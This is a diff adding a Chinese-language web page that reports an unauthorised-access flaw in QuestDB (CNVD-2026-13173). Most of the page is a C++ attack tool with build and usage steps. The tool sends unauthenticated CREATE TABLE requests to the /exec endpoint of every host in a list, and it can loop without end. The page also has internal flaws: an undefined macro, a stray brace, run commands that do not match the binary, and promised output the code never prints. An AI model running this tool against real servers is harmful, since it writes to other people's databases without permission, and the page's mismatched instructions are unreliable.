@@ -1,0 +1,799 @@
+<!DOCTYPE html>
+<html lang="zh-CN" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0" />
+    <title>CNVD-2026-13173 QuestDB 未授权访问漏洞分析报告 - 哪吒网络安全</title>
+    <!-- SEO Meta Tags -->
+    <meta name="description" content="CNVD-2026-13173 漏洞分析报告：详细分析了 QuestDB 数据库的未授权访问漏洞及潜在风险。由哪吒网络安全出具的专业漏洞分析报告。" />
+    <meta name="keywords" content="CNVD-2026-13173,QuestDB,未授权访问,漏洞分析,安全测试,数据库安全,安全研究" />
+    <meta name="author" content="哪吒网络安全" />
+    <meta name="robots" content="index, follow" />
+    
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/themes/prism-tomorrow.min.css" rel="stylesheet" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" />
+    
+    <style>
+        :root {
+            --primary-blue: #2563eb;
+            --primary-purple: #9333ea;
+        }
+        body {
+            font-family: "Inter", "Microsoft YaHei", "PingFang SC", "Hiragino Sans GB", sans-serif;
+        }
+        @media (max-width: 640px) {
+            body { font-size: 14px; }
+            .mobile-collapse { width: 100%; display: block; overflow-x: auto; -webkit-overflow-scrolling: touch; }
+            .mobile-text-lg { font-size: 1.125rem; }
+            table { font-size: 0.875rem; }
+            table th, table td { padding: 0.75rem 0.5rem; }
+            pre { font-size: 0.75rem; padding: 0.75rem; }
+        }
+        .nav-link { position: relative; }
+        .nav-link::after {
+            content: '';
+            position: absolute;
+            width: 0;
+            height: 2px;
+            bottom: -4px;
+            left: 0;
+            background-color: var(--primary-blue);
+            transition: width 0.3s ease;
+        }
+        .nav-link:hover::after { width: 100%; }
+        .glass-nav { background: rgba(255, 255, 255, 0.9); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); }
+        .hero-gradient { background: radial-gradient(circle at top left, #f8fafc, #f1f5f9); }
+        .section-card { background: white; border-radius: 1.25rem; box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.05), 0 4px 6px -2px rgba(0, 0, 0, 0.02); transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1); }
+        .section-card:hover { transform: translateY(-4px); box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04); }
+        .custom-scrollbar::-webkit-scrollbar { width: 6px; }
+        .custom-scrollbar::-webkit-scrollbar-track { background: #1f2937; }
+        .custom-scrollbar::-webkit-scrollbar-thumb { background: #4b5563; border-radius: 10px; }
+        .custom-scrollbar::-webkit-scrollbar-thumb:hover { background: #6b7280; }
+    </style>
+</head>
+
+<body class="bg-gray-50 font-sans text-gray-900 leading-relaxed">
+    <!-- Navigation -->
+    <nav class="glass-nav shadow-md fixed w-full z-50 transition-all duration-300">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex justify-between items-center h-16">
+                <div class="flex items-center space-x-3">
+                    <i class="fas fa-shield-halved text-blue-600 text-2xl animate-pulse"></i>
+                    <span class="text-xl font-bold bg-gradient-to-r from-blue-600 to-purple-600 bg-clip-text text-transparent">
+                        CNVD-2026-13173 漏洞分析报告
+                    </span>
+                </div>
+                <!-- Desktop Navigation -->
+                <div class="hidden md:flex items-center space-x-8">
+                    <a href="#intro" class="nav-link text-gray-600 hover:text-blue-600 font-medium">简介</a>
+                    <a href="#vulnerability" class="nav-link text-gray-600 hover:text-blue-600 font-medium">漏洞分析</a>
+                    <a href="#tool" class="nav-link text-gray-600 hover:text-blue-600 font-medium">测试工具</a>
+                    <a href="#usage" class="nav-link text-gray-600 hover:text-blue-600 font-medium">使用指南</a>
+                    <a href="#poc" class="nav-link text-gray-600 hover:text-blue-600 font-medium">POC代码</a>
+                    <a href="#mitigation" class="nav-link text-gray-600 hover:text-blue-600 font-medium">修复建议</a>
+                </div>
+                <!-- Mobile Menu Button -->
+                <button id="mobile-menu-button" class="md:hidden focus:outline-none p-2 hover:bg-gray-100 rounded-lg">
+                    <i class="fas fa-bars text-blue-600 text-xl"></i>
+                </button>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Mobile Menu -->
+    <div id="mobile-menu" class="hidden fixed inset-0 bg-white z-40 pt-20 px-6 space-y-4">
+        <a href="#intro" class="block text-lg font-medium text-gray-700 hover:text-blue-600">简介</a>
+        <a href="#vulnerability" class="block text-lg font-medium text-gray-700 hover:text-blue-600">漏洞分析</a>
+        <a href="#tool" class="block text-lg font-medium text-gray-700 hover:text-blue-600">测试工具</a>
+        <a href="#usage" class="block text-lg font-medium text-gray-700 hover:text-blue-600">使用指南</a>
+        <a href="#mitigation" class="block text-lg font-medium text-gray-700 hover:text-blue-600">修复建议</a>
+    </div>
+
+    <!-- Main Content -->
+    <main class="pt-24 pb-16 max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+        
+        <!-- Hero Section -->
+        <header id="hero" class="text-center mb-16 py-12 hero-gradient rounded-3xl shadow-inner">
+            <h1 class="text-3xl md:text-5xl font-extrabold text-gray-900 mb-6 px-4">
+                CNVD-2026-13173<br/><span class="text-blue-600">QuestDB 未授权访问漏洞分析报告</span>
+            </h1>
+            
+            <div class="flex flex-wrap justify-center gap-4 mb-8">
+                <span class="px-4 py-2 bg-yellow-100 text-yellow-700 rounded-full font-bold flex items-center shadow-sm">
+                    <i class="fas fa-exclamation-triangle mr-2"></i>危害级别: 中 (AV:N/AC:L/Au:N/C:P/I:N/A:N)
+                </span>
+                <span class="px-4 py-2 bg-blue-100 text-blue-700 rounded-full font-bold flex items-center shadow-sm">
+                    <i class="fas fa-calendar-check mr-2"></i>公开日期: 2026-02-14
+                </span>
+                <span class="px-4 py-2 bg-purple-100 text-purple-700 rounded-full font-bold flex items-center shadow-sm">
+                    <i class="fas fa-user-shield mr-2"></i>哪吒网络安全安全团队
+                </span>
+            </div>
+
+            <!-- Benevolence Statement -->
+            <div class="max-w-3xl mx-auto bg-white/50 backdrop-blur-sm p-6 rounded-2xl border-l-4 border-blue-500 text-left mx-4">
+                <h4 class="text-lg font-bold text-blue-800 mb-2 flex items-center">
+                    <i class="fas fa-heart text-blue-600 mr-2"></i>善意声明
+                </h4>
+                <p class="text-blue-700 text-sm leading-relaxed font-medium">
+                    作为一名怀着赤诚之心的安全研究员，我谨在此郑重声明：本次安全审计的唯一目的是帮助改进系统安全性，为保护用户数据安全尽一份力。报告中所有敏感信息均已进行脱敏处理。我始终秉持"善意披露、负责任报告"的原则，协助开发团队尽快修复安全隐患。
+                </p>
+            </div>
+        </header>
+
+        <!-- Section 1: Introduction -->
+        <section id="intro" class="mb-12 section-card p-8">
+            <div class="flex items-center mb-6">
+                <div class="w-12 h-12 bg-blue-100 rounded-xl flex items-center justify-center mr-4">
+                    <i class="fas fa-database text-blue-600 text-xl"></i>
+                </div>
+                <h2 class="text-2xl font-bold">1. 漏洞概述</h2>
+            </div>
+            <div class="grid md:grid-cols-2 gap-8">
+                <div>
+                    <h3 class="text-xl font-semibold mb-3 text-gray-800">1.1 什么是 CNVD-2026-13173</h3>
+                    <p class="text-gray-600">
+                        CNVD-2026-13173 是一个影响 QuestDB 数据库的未授权访问漏洞。QuestDB 是一个开源的时间序列数据库，以其极快的导入速度和动态、低延迟的 SQL 查询能力而闻名。
+                    </p>
+                </div>
+                <div>
+                    <h3 class="text-xl font-semibold mb-3 text-gray-800">1.2 漏洞基本信息</h3>
+                    <div class="overflow-hidden border rounded-lg">
+                        <table class="min-w-full divide-y divide-gray-200">
+                            <thead class="bg-gray-50">
+                                <tr>
+                                    <th class="px-4 py-2 text-left text-xs font-bold text-gray-500 uppercase">信息项</th>
+                                    <th class="px-4 py-2 text-left text-xs font-bold text-gray-500 uppercase">详情</th>
+                                </tr>
+                            </thead>
+                            <tbody class="divide-y divide-gray-200 bg-white">
+                                <tr>
+                                    <td class="px-4 py-2 text-sm">漏洞类型</td>
+                                    <td class="px-4 py-2 text-sm">未授权访问漏洞</td>
+                                </tr>
+                                <tr>
+                                    <td class="px-4 py-2 text-sm">危害级别</td>
+                                    <td class="px-4 py-2 text-sm">中 (AV:N/AC:L/Au:N/C:P/I:N/A:N)</td>
+                                </tr>
+                                <tr>
+                                    <td class="px-4 py-2 text-sm">影响产品</td>
+                                    <td class="px-4 py-2 text-sm">QuestDB</td>
+                                </tr>
+                                <tr>
+                                    <td class="px-4 py-2 text-sm">公开日期</td>
+                                    <td class="px-4 py-2 text-sm">2026-02-14</td>
+                                </tr>
+                                <tr>
+                                    <td class="px-4 py-2 text-sm">报送日期</td>
+                                    <td class="px-4 py-2 text-sm">2026-02-26</td>
+                                </tr>
+                                <tr>
+                                    <td class="px-4 py-2 text-sm">收录日期</td>
+                                    <td class="px-4 py-2 text-sm">2026-03-10</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Section 2: Vulnerability Analysis -->
+        <section id="vulnerability" class="mb-12 section-card p-8 border-t-4 border-red-500">
+            <div class="flex items-center mb-6">
+                <div class="w-12 h-12 bg-red-100 rounded-xl flex items-center justify-center mr-4">
+                    <i class="fas fa-unlock-alt text-red-600 text-xl"></i>
+                </div>
+                <h2 class="text-2xl font-bold">2. 漏洞详情</h2>
+            </div>
+            <div class="space-y-6">
+                <div>
+                    <h3 class="text-xl font-semibold mb-3">2.1 漏洞描述</h3>
+                    <p class="text-gray-600 mb-4">
+                        QuestDB 存在未授权访问漏洞，攻击者可利用该漏洞获取敏感信息。具体来说，QuestDB 的认证配置失效导致未授权用户能够访问系统中的敏感数据。
+                    </p>
+                    <div class="p-4 bg-yellow-50 border-l-4 border-yellow-400 rounded-r-lg">
+                        <p class="text-yellow-700 text-sm">
+                            <i class="fas fa-exclamation-triangle mr-2"></i>
+                            该漏洞允许攻击者绕过身份验证机制，无需提供有效凭证即可访问受保护的 API 端点。
+                        </p>
+                    </div>
+                </div>
+                <div>
+                    <h3 class="text-xl font-semibold mb-3">2.2 漏洞成因</h3>
+                    <ul class="list-disc list-inside space-y-2 text-gray-600">
+                        <li>身份验证配置失效，导致无需提供有效凭证即可访问受保护的 API 端点</li>
+                        <li>认证逻辑存在缺陷，可能允许空凭证或错误凭证通过验证</li>
+                        <li>格式错误的 Authorization 头部可能被后端解析器错误处理</li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="text-xl font-semibold mb-3">2.3 潜在危害</h3>
+                    <div class="grid md:grid-cols-2 gap-4">
+                        <div class="p-4 bg-red-50 rounded-xl border border-red-100">
+                            <span class="font-bold text-red-700">数据泄露:</span>
+                            <p class="text-red-600 text-sm mt-1">攻击者可以访问数据库中的敏感信息，包括业务数据、用户信息等。</p>
+                        </div>
+                        <div class="p-4 bg-orange-50 rounded-xl border border-orange-100">
+                            <span class="font-bold text-orange-700">数据破坏:</span>
+                            <p class="text-orange-600 text-sm mt-1">攻击者可能执行破坏性操作，如删除表或修改数据。</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Section 3: Testing Tool -->
+        <section id="tool" class="mb-12 section-card p-8 border-t-4 border-purple-500">
+            <div class="flex items-center mb-6">
+                <div class="w-12 h-12 bg-purple-100 rounded-xl flex items-center justify-center mr-4">
+                    <i class="fas fa-tools text-purple-600 text-xl"></i>
+                </div>
+                <h2 class="text-2xl font-bold">3. 漏洞测试工具</h2>
+            </div>
+            <div class="space-y-6">
+                <div>
+                    <h3 class="text-xl font-semibold mb-3">3.1 项目结构</h3>
+                    <div class="bg-gray-800 rounded-xl p-4 mb-4">
+                        <pre><code class="language-bash">CNVD-2026-13173/
+├── inject.cc          # 主测试工具（C++版本）
+├── README.md          # 项目说明文档
+└── hosts.txt          # 目标主机列表示例（可选）</code></pre>
+                    </div>
+                </div>
+                <div>
+                    <h3 class="text-xl font-semibold mb-3">3.2 工具功能</h3>
+                    <div class="grid md:grid-cols-2 gap-4">
+                        <div class="p-4 bg-green-50 rounded-xl border border-green-100">
+                            <i class="fas fa-check-circle text-green-600 mr-2"></i>
+                            <span class="font-bold text-green-700">多主机批量测试</span>
+                            <p class="text-green-600 text-sm mt-1">支持从文件读取多个目标主机地址</p>
+                        </div>
+                        <div class="p-4 bg-green-50 rounded-xl border border-green-100">
+                            <i class="fas fa-check-circle text-green-600 mr-2"></i>
+                            <span class="font-bold text-green-700">循环执行模式</span>
+                            <p class="text-green-600 text-sm mt-1">支持有限次数循环和无限循环两种模式</p>
+                        </div>
+                        <div class="p-4 bg-green-50 rounded-xl border border-green-100">
+                            <i class="fas fa-check-circle text-green-600 mr-2"></i>
+                            <span class="font-bold text-green-700">随机 SQL 生成</span>
+                            <p class="text-green-600 text-sm mt-1">自动生成随机的表名和列定义进行注入测试</p>
+                        </div>
+                        <div class="p-4 bg-green-50 rounded-xl border border-green-100">
+                            <i class="fas fa-check-circle text-green-600 mr-2"></i>
+                            <span class="font-bold text-green-700">实时进度显示</span>
+                            <p class="text-green-600 text-sm mt-1">显示每次注入的详细信息和 HTTP 响应状态</p>
+                        </div>
+                    </div>
+                </div>
+                <div>
+                    <h3 class="text-xl font-semibold mb-3">3.3 环境要求</h3>
+                    <div class="bg-gray-50 p-6 rounded-2xl border border-gray-100">
+                        <h4 class="font-bold text-gray-800 mb-2">编译环境</h4>
+                        <ul class="list-disc list-inside space-y-1 text-gray-600 text-sm mb-4">
+                            <li>编译器：GCC/G++ 编译器（支持 C++11 标准）</li>
+                            <li>依赖库：libcurl 开发库</li>
+                            <li>操作系统：POSIX 兼容系统（Linux, macOS 等）</li>
+                        </ul>
+                        <h4 class="font-bold text-gray-800 mb-2">运行环境</h4>
+                        <ul class="list-disc list-inside space-y-1 text-gray-600 text-sm">
+                            <li>运行时依赖：libcurl 库</li>
+                            <li>网络要求：能够访问目标 QuestDB 服务器</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Section 4: Usage Guide -->
+        <section id="usage" class="mb-12 section-card p-8 border-t-4 border-green-500">
+            <div class="flex items-center mb-6">
+                <div class="w-12 h-12 bg-green-100 rounded-xl flex items-center justify-center mr-4">
+                    <i class="fas fa-book text-green-600 text-xl"></i>
+                </div>
+                <h2 class="text-2xl font-bold">4. 使用指南</h2>
+            </div>
+            <div class="space-y-6">
+                <div>
+                    <h3 class="text-xl font-semibold mb-3">4.1 编译教程</h3>
+                    <div class="space-y-4">
+                        <div>
+                            <h4 class="font-bold text-gray-800 mb-2">步骤 1：安装依赖</h4>
+                            <div class="bg-gray-800 rounded-xl p-4 mb-4">
+                                <pre><code class="language-bash"># Ubuntu/Debian 系统：
+sudo apt update
+sudo apt install g++ libcurl4-openssl-dev
+
+# CentOS/RHEL 系统：
+sudo yum install gcc-c++ curl-devel
+
+# macOS 系统：
+brew install gcc curl</code></pre>
+                            </div>
+                        </div>
+                        <div>
+                            <h4 class="font-bold text-gray-800 mb-2">步骤 2：编译工具</h4>
+                            <div class="bg-gray-800 rounded-xl p-4 mb-4">
+                                <pre><code class="language-bash">g++ -o inject inject.cc -lcurl -std=c++11 -O2 -Wall -Wextra</code></pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div>
+                    <h3 class="text-xl font-semibold mb-3">4.2 基本语法</h3>
+                    <div class="bg-gray-800 rounded-xl p-4 mb-4">
+                        <pre><code class="language-bash">./inject -f &lt;主机文件&gt; -l &lt;循环次数|inf&gt;</code></pre>
+                    </div>
+                    <div class="bg-gray-50 p-6 rounded-2xl border border-gray-100">
+                        <h4 class="font-bold text-gray-800 mb-2">参数说明</h4>
+                        <ul class="list-disc list-inside space-y-2 text-gray-600 text-sm">
+                            <li><strong>-f, --file &lt;主机文件&gt;</strong>：指定包含目标主机列表的文件路径</li>
+                            <li><strong>-l, --loop &lt;循环次数|inf&gt;</strong>：指定循环执行次数</li>
+                        </ul>
+                    </div>
+                </div>
+                <div>
+                    <h3 class="text-xl font-semibold mb-3">4.3 使用示例</h3>
+                    <div class="grid md:grid-cols-2 gap-4">
+                        <div class="p-4 bg-gray-50 rounded-xl border border-gray-100">
+                            <h4 class="font-bold text-gray-800 mb-2">示例 1：对单主机执行 1 次测试</h4>
+                            <div class="bg-gray-800 rounded-xl p-4">
+                                <pre><code class="language-bash">./inject -f hosts.txt -l 1</code></pre>
+                            </div>
+                        </div>
+                        <div class="p-4 bg-gray-50 rounded-xl border border-gray-100">
+                            <h4 class="font-bold text-gray-800 mb-2">示例 2：对多主机执行 5 次循环测试</h4>
+                            <div class="bg-gray-800 rounded-xl p-4">
+                                <pre><code class="language-bash">./inject -f target_hosts.txt -l 5</code></pre>
+                            </div>
+                        </div>
+                        <div class="p-4 bg-gray-50 rounded-xl border border-gray-100">
+                            <h4 class="font-bold text-gray-800 mb-2">示例 3：无限循环测试模式</h4>
+                            <div class="bg-gray-800 rounded-xl p-4">
+                                <pre><code class="language-bash">./inject -f hosts.txt -l inf</code></pre>
+                            </div>
+                        </div>
+                        <div class="p-4 bg-gray-50 rounded-xl border border-gray-100">
+                            <h4 class="font-bold text-gray-800 mb-2">示例 4：使用默认 localhost 目标</h4>
+                            <div class="bg-gray-800 rounded-xl p-4">
+                                <pre><code class="language-bash">./inject -l 3</code></pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div>
+                    <h3 class="text-xl font-semibold mb-3">4.4 结果解读</h3>
+                    <div class="overflow-hidden border rounded-lg">
+                        <table class="min-w-full divide-y divide-gray-200">
+                            <thead class="bg-gray-50">
+                                <tr>
+                                    <th class="px-4 py-2 text-left text-xs font-bold text-gray-500 uppercase">HTTP 状态码</th>
+                                    <th class="px-4 py-2 text-left text-xs font-bold text-gray-500 uppercase">含义</th>
+                                </tr>
+                            </thead>
+                            <tbody class="divide-y divide-gray-200 bg-white">
+                                <tr>
+                                    <td class="px-4 py-2 text-sm">200</td>
+                                    <td class="px-4 py-2 text-sm">请求成功，目标可能存在漏洞</td>
+                                </tr>
+                                <tr>
+                                    <td class="px-4 py-2 text-sm">401/403</td>
+                                    <td class="px-4 py-2 text-sm">访问被拒绝，目标可能已修复漏洞</td>
+                                </tr>
+                                <tr>
+                                    <td class="px-4 py-2 text-sm">404</td>
+                                    <td class="px-4 py-2 text-sm">请求的路径不存在</td>
+                                </tr>
+                                <tr>
+                                    <td class="px-4 py-2 text-sm">其他</td>
+                                    <td class="px-4 py-2 text-sm">需要根据具体情况分析</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Section 5: POC Code -->
+        <section id="poc" class="mb-12 section-card p-8 border-t-4 border-orange-500">
+            <div class="flex items-center mb-6">
+                <div class="w-12 h-12 bg-orange-100 rounded-xl flex items-center justify-center mr-4">
+                    <i class="fas fa-vial text-orange-600 text-xl"></i>
+                </div>
+                <h2 class="text-2xl font-bold">5. POC 代码</h2>
+            </div>
+            <div class="space-y-6">
+                <div>
+                    <h3 class="text-xl font-semibold mb-3">5.1 C++ POC 示例</h3>
+                    <p class="text-gray-600 mb-4">
+                        以下是一个 C++ 代码示例，用于测试 QuestDB 的未授权访问漏洞：
+                    </p>
+                    <div class="bg-gray-800 rounded-xl p-4 mb-4">
+                        <pre><code class="language-cpp">
+#define 结构 struct
+#define 类 class
+#define 函数 void
+#define 整数 int
+#define 布尔 bool
+#define 字符串 std::string
+#define 向量 std::vector
+#define 常量 const
+#define 静态 static
+#define 空 nullptr
+
+#define 开始 {
+#define 结束 }
+#define 如果 if
+#define 否则 else
+#define 当 while
+#define 对于 for
+#define 开关 switch
+#define 案例 case
+#define 跳出 break
+#define 继续 continue
+#define 返回 return
+
+#define 公开 public
+#define 私有 private
+#define 保护 protected
+
+#define 输出 std::cout
+#define 输入 std::cin
+
+#include <iostream>
+#include <fstream>
+#include <string>
+#include <vector>
+#include <cstring>
+#include <cstdlib>
+#include <unistd.h>
+#include <getopt.h>
+#include <ctime>
+#include <curl/curl.h>
+
+结构 选项结构体 开始
+    字符串 主机文件路径;
+    整数 循环次数 = 1;
+    布尔 无限循环标志 = false;
+结束;
+
+
+选项结构体 解析命令行参数(整数 参数数量, char** 参数数组) 开始
+    选项结构体 选项;
+    整数 c;
+    结构 option 长选项数组[] = 开始
+        {"file",   required_argument, 空, 'f'},
+        {"loop",   required_argument, 空, 'l'},
+        {"l",      required_argument, 空, 'l'},
+        {空, 0, 空, 0}
+    结束;
+
+    当 ((c = getopt_long(参数数量, 参数数组, "f:l:", 长选项数组, 空)) != -1) 开始
+        开关 (c) 开始
+            案例 'f':
+                选项.主机文件路径 = optarg;
+                跳出;
+            案例 'l':
+                如果 (strcmp(optarg, "inf") == 0 || strcmp(optarg, "0") == 0) 开始
+                    选项.无限循环标志 = true;
+                    选项.循环次数 = -1;
+                结束 否则 开始
+                    选项.循环次数 = std::atoi(optarg);
+                    如果 (选项.循环次数 <= 0) 开始
+                        std::cerr << "错误：循环次数必须为正整数或 inf\n";
+                        exit(1);
+                    结束
+                结束
+                跳出;
+            默认:
+                std::cerr << "用法: " << 参数数组[0] << " -f <主机文件> -l <次数|inf>\n";
+                exit(1);
+        结束
+    结束
+    返回 选项;
+结束
+
+// 从文件读取主机列表（忽略空行和 # 注释）
+向量<字符串> 从文件读取主机列表(常量 字符串& 文件名) 开始
+    向量<字符串> 主机列表;
+    std::ifstream 文件(文件名);
+    如果 (!文件.is_open()) 开始
+        std::perror("fopen");
+        返回 主机列表;
+    结束
+
+    字符串 行;
+    当 (std::getline(文件, 行)) 开始
+        // 去除行首尾空白
+        size_t 开始位置 = 行.find_first_not_of(" \t");
+        如果 (开始位置 == 字符串::npos) 继续;  // 空行
+        size_t 结束位置 = 行.find_last_not_of(" \t");
+        字符串 修剪后 = 行.substr(开始位置, 结束位置 - 开始位置 + 1);
+
+        // 跳过注释行（# 开头）
+        如果 (修剪后.empty() || 修剪后[0] == '#') 继续;
+
+        主机列表.push_back(修剪后);
+    结束
+    返回 主机列表;
+结束
+
+// 生成随机小写字母字符串
+字符串 随机字符串(size_t 长度) 开始
+    静态 常量 char 字符集[] = "abcdefghijklmnopqrstuvwxyz";
+    静态 布尔 已初始化随机种子 = false;
+    如果 (!已初始化随机种子) 开始
+        std::srand(std::time(空) ^ getpid());
+        已初始化随机种子 = true;
+    结束
+    字符串 结果;
+    对于 (size_t i = 0; i < 长度; ++i) 开始
+        结果 += 字符集[std::rand() % (sizeof(字符集) - 1)];
+    结束
+    返回 结果;
+结束
+
+// libcurl 写入回调（忽略响应体）
+size_t 写入回调函数(void* 内容, size_t 大小, size_t 元素数量, void* 用户指针) 开始
+    返回 大小 * 元素数量;
+结束
+
+// 对单个主机执行注入
+函数 执行表注入(常量 字符串& 主机地址, 整数 端口号) 开始
+    // 随机表名 (5-10 字母)
+    整数 表名长度 = 5 + std::rand() % 6;
+    字符串 表名 = 随机字符串(表名长度);
+
+    // 随机列 (2-10 列)
+    整数 列数量 = 2 + std::rand() % 9;
+    字符串 列定义;
+    对于 (整数 i = 0; i < 列数量; ++i) 开始
+        如果 (i > 0) 列定义 += ", ";
+        列定义 += 随机字符串(5) + " INT";
+    结束
+
+    // 构造 SQL
+    字符串 查询语句 = "CREATE TABLE " + 表名 + " (" + 列定义 + ");";
+
+    // 构造 URL
+    字符串 url;
+    如果 (主机地址.find("http://") == 0 || 主机地址.find("https://") == 0) 开始
+        url = 主机地址 + "/exec";
+    结束 否则 开始
+        url = "http://" + 主机地址 + ":" + std::to_string(端口号) + "/exec";
+    结束
+
+    CURL* curl指针 = curl_easy_init();
+    如果 (!curl指针) 开始
+        std::cerr << "curl_easy_init 失败\n";
+        返回;
+    结束
+
+    // URL 编码查询参数
+    char* 编码后的查询 = curl_easy_escape(curl指针, 查询语句.c_str(), 0);
+    字符串 完整URL = url + "?query=" + 编码后的查询;
+    curl_easy_setopt(curl指针, CURLOPT_URL, 完整URL.c_str());
+    curl_easy_setopt(curl指针, CURLOPT_HTTPGET, 1L);
+    curl_easy_setopt(curl指针, CURLOPT_WRITEFUNCTION, 写入回调函数);
+    curl_easy_setopt(curl指针, CURLOPT_TIMEOUT, 10L);
+
+    CURLcode 执行结果 = curl_easy_perform(curl指针);
+    long HTTP状态码 = 0;
+    如果 (执行结果 == CURLE_OK) 开始
+        curl_easy_getinfo(curl指针, CURLINFO_RESPONSE_CODE, &HTTP状态码);
+    结束 否则 开始
+        HTTP状态码 = -1;
+    结束
+    curl_easy_cleanup(curl指针);
+    curl_free(编码后的查询);
+
+    // 输出时间戳
+    time_t 当前时间 = std::time(空);
+    结构 tm* 时间信息 = std::localtime(&当前时间);
+    char 时间缓冲区[32];
+    std::strftime(时间缓冲区, sizeof(时间缓冲区), "%H:%M:%S", 时间信息);
+
+    输出 << "[" << 时间缓冲区 << "] 正在注入表: " << 表名
+         << " @ " << 主机地址 << " | 状态码: " << HTTP状态码 << std::endl;
+结束
+
+整数 main(整数 参数数量, char** 参数数组) 开始
+    选项结构体 选项 = 解析命令行参数(参数数量, 参数数组);
+
+    // 获取主机列表
+    向量<字符串> 主机列表;
+    如果 (!选项.主机文件路径.empty()) 开始
+        主机列表 = 从文件读取主机列表(选项.主机文件路径);
+        如果 (主机列表.empty()) 开始
+            std::cerr << "错误：无法从文件 " << 选项.主机文件路径 << " 读取有效主机\n";
+            返回 1;
+        结束
+    结束 否则 开始
+        // 默认 localhost
+        主机列表.push_back("localhost");
+    结束
+
+    输出 << "[*] 目标主机列表:\n";
+    对于 (常量 auto& h : 主机列表) 开始
+        输出 << "    " << h << std::endl;
+    结束
+    如果 (选项.无限循环标志) 开始
+        输出 << "[*] 循环模式: 无限循环 (按 Ctrl+C 停止)\n";
+    结束 否则 开始
+        输出 << "[*] 循环模式: " << 选项.循环次数 << " 次\n";
+    结束
+    输出 << "[*] 目标端口: " << 9000<< "\n\n";
+
+    curl_global_init(CURL_GLOBAL_ALL);
+
+    整数 全局循环计数器 = 1;
+    当 (true) 开始
+        对于 (常量 auto& 主机 : 主机列表) 开始
+            如果 (!选项.无限循环标志) 开始
+                输出 << "--- 循环 " << 全局循环计数器 << "/" << 选项.循环次数
+                     << " - 目标主机: " << 主机 << " ---\n";
+            结束 否则 开始
+                输出 << "--- 全局循环 #" << 全局循环计数器 << " - 目标主机: " << 主机 << " ---\n";
+            结束
+            执行表注入(主机, 9000);
+        结束
+        全局循环计数器++;
+
+        如果 (!选项.无限循环标志) 开始
+            如果 (全局循环计数器 > 选项.循环次数) 跳出;
+        结束 否则 开始
+            usleep(500000);  // 0.5 秒
+        结束
+    结束
+
+    curl_global_cleanup();
+    返回 0;
+结束
+}</code></pre>
+                    </div>
+                </div>
+                <div>
+                    <h3 class="text-xl font-semibold mb-3">5.2 使用方法</h3>
+                    <div class="bg-gray-50 p-6 rounded-2xl border border-gray-100">
+                        <h4 class="font-bold text-gray-800 mb-2">步骤 1：安装依赖</h4>
+                        <div class="bg-gray-800 rounded-xl p-4 mb-4">
+                            <pre><code class="language-bash"># Ubuntu/Debian 系统：
+sudo apt update
+sudo apt install g++ libcurl4-openssl-dev
+
+# CentOS/RHEL 系统：
+sudo yum install gcc-c++ curl-devel
+
+# macOS 系统：
+brew install gcc curl</code></pre>
+                        </div>
+                        <h4 class="font-bold text-gray-800 mb-2">步骤 2：编译代码</h4>
+                        <div class="bg-gray-800 rounded-xl p-4 mb-4">
+                            <pre><code class="language-bash">https://github.com/ctkqiang/CNVD-2026-1317.git</code></pre>
+                        </div>
+                        <h4 class="font-bold text-gray-800 mb-2">步骤 2：编译代码</h4>
+                        <div class="bg-gray-800 rounded-xl p-4 mb-4">
+                            <pre><code class="language-bash">g++ -o inject inject.cc -lcurl -std=c++11 -O2 -Wall -Wextra</code></pre>
+                        </div>
+                        <h4 class="font-bold text-gray-800 mb-2">步骤 3：运行程序</h4>
+                        <div class="bg-gray-800 rounded-xl p-4 mb-4">
+                            <pre><code class="language-bash">./poc http://target:9000</code></pre>
+                        </div>
+                    </div>
+                </div>
+                <div>
+                    <h3 class="text-xl font-semibold mb-3">5.3 预期结果</h3>
+                    <div class="bg-gray-50 p-6 rounded-2xl border border-gray-100">
+                        <ul class="list-disc list-inside space-y-2 text-gray-600 text-sm">
+                            <li>如果目标存在漏洞，程序将显示 "[VULNERABLE] 未授权访问成功！"</li>
+                            <li>如果目标已修复漏洞，程序将显示 "访问被拒绝"</li>
+                            <li>如果目标无法访问，程序将显示相应的错误信息</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Section 6: Mitigation -->
+        <section id="mitigation" class="mb-12 section-card p-8 border-t-4 border-blue-600">
+            <div class="flex items-center mb-6">
+                <div class="w-12 h-12 bg-blue-100 rounded-xl flex items-center justify-center mr-4">
+                    <i class="fas fa-shield-alt text-blue-600 text-xl"></i>
+                </div>
+                <h2 class="text-2xl font-bold">5. 修复与防御建议</h2>
+            </div>
+            <div class="space-y-6">
+                <div class="flex items-start">
+                    <div class="w-8 h-8 bg-blue-600 text-white rounded-lg flex items-center justify-center mr-4 shrink-0 mt-1">1</div>
+                    <div>
+                        <h4 class="font-bold text-gray-800">临时解决方案</h4>
+                        <p class="text-gray-600 text-sm">在 QuestDB 前端部署反向代理（如 Nginx）并启用 HTTP Basic 认证，作为额外的访问控制层。</p>
+                    </div>
+                </div>
+                <div class="flex items-start">
+                    <div class="w-8 h-8 bg-blue-600 text-white rounded-lg flex items-center justify-center mr-4 shrink-0 mt-1">2</div>
+                    <div>
+                        <h4 class="font-bold text-gray-800">正式解决方案</h4>
